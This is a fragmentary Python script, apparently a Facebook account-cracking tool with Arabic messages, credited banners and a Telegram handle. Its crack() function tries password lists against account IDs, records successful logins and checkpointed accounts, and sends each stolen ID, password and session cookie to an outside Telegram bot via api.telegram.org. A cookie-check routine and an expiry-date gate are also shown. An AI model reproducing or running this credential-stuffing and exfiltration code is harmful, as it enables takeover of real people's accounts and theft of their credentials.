...
an2 = datetime.datetime(2024,10,9,00,0)
hours = (now.hour)
if an > an2 or an == an2:
 ...
 print('')
 print('𓏳'*60)
 print('\t\n\033[1;31m 𓆩 ⏤‌MABAST ⏤‌🇮🇶⃤ 𓆪 ‏ الـــمـــطـــوࢪ   ')
...
output = render('MABAST', colors=['blue', 'green'], align='center')
print(output)
print('\n')
        ...
        with requests.Session() as rsn:
            try:
                ...
                if '"access_token":' in str(response.headers):
                    ...
                    print('\n[✔️] كوكيز شغال اخرج وارجع شغله')

                else:
                    print("'NoneType' object has no attribute 'group'")
            except:
                print('\n[✔️] كوكيز شغال اخرج وارجع شغله');time.sleep(1)
        exit()
    except Exception as e:
...
#		HAMAx13()
	...
	os.system('clear')
	print('''
───────────────────────────────────────────────────\n\x1b[1;32m(\x1b[1;35m+\x1b[1;32m) \x1b[1;33m Telegram\x1b[1;35m | \x1b[1;32m @GG6TG \x1b[1;35m (\x1b[1;32m+\x1b[1;35m) \x1b[1;33m instgram : 3fw_0  \x1b[1;32m\n\x1b[1;───────────────────────────────────────────────────   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ''')
...
def setting():
    ...
    if hu in ['1','01']:
        ...
        for bacot in id:
            ...
            id2.insert(xx,bacot)
    print('\033[0;92m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] \x1b[33m\x1b[33m\x1b[33m[\033[0;92mSHOW \x1b[36mCOOKIES\x1b[33m]")
    print('\033[0;92m==================')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[\033[1;3MABAST1m  \033[1;32m\033[1;33m\033[1;34m\033[1;35m\033[1;32m]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print ('\x1b[36m|CP.|')
				WATq=f'\r\033[0;93m[\33[1;96m[CP]\33[1;93m]  {idf}  {pw} '
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(WATq))
				...
				print ('\x1b[32m|شغال')
				WAT = f'Dec_By_DEMO\n\r\33[1;93m[\33[1;92m[OK]\33[1;93m] \33[1;92m{idf} {pw} | \n\033[0;92m{kuki} '
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(WAT))
